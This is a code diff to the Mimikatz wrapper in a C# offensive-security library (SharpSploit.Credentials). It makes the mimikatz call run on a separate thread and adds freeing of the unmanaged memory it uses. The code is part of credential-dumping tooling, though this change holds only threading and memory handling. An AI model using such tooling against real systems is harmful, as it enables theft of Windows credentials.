@@ -4,6 +4,7 @@
 
 using System;
 using System.Text;
+using System.Threading;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 
@@ -71,8 +72,28 @@ namespace SharpSploit.Credentials
             IntPtr input = Marshal.StringToHGlobalUni(Command);
             try
             {
-                IntPtr output = mimikatz(input);
-                return Marshal.PtrToStringUni(output);
+                IntPtr output = IntPtr.Zero;
+                Thread t = new Thread(() =>
+                {
+                    try
+                    {
+                        output = mimikatz(input);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.Error.WriteLine("MimikatzException: " + e.Message + e.StackTrace);
+                    }
+                });
+                t.Start();
+                t.Join();
+                Marshal.FreeHGlobal(input);
+                if (output == IntPtr.Zero)
+                {
+                    return "";
+                }
+                string stroutput = Marshal.PtrToStringUni(output);
+                Win32.Kernel32.LocalFree(output);
+                return stroutput;
             }
             catch (Exception e)
             {
